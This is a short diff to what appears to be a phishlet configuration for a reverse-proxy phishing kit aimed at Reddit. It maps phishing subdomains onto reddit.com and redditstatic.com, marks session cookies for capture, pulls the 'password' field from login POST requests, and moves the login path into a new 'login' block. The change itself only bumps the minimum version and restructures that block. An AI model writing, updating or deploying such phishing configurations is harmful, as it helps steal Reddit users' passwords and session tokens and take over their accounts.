@@ -1,5 +1,5 @@
 author: '@customsync'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'reddit.com', session: true, is_landing: true}
   - {phish_sub: 'win', orig_sub: 'www', domain: 'redditstatic.com', session: false, is_landing: false}
@@ -24,5 +24,6 @@ credentials:
     key: 'password'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/login'
+login:
+  domain: 'www.reddit.com'
+  path: '/login'
